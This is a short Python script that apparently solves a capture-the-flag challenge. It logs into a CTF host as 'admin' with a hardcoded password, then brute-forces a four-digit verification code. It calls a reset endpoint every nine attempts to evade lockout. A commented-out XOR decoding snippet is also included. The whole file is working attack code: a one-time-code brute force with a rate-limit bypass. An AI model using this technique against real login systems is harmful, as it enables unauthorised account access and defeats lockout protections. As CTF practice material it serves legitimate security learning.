import requests
s = requests.Session()
url = 'https://3d1d65ca-96b9-4755-ae76-25f9fbab01f3.ctf.ctfinf.ru'
gt = s.post(url, data={'username':'admin','password':'Incom2024!'})
for x in range(1, 10000):
    gt = s.post(url, data={'auth': 'true', 'code': str(x)})
    if 'Неверный код' not in gt.text:
        print(x)
        break
    if x % 9 == 0:
        gt = s.get(url + '/reset')
    if x % 100 == 0:
        print(x, gt.text)
# s = r'|v{}aBUHEW{in\x7fhg'
# for x in s:
#     print(chr(ord(x) ^ 26), end='')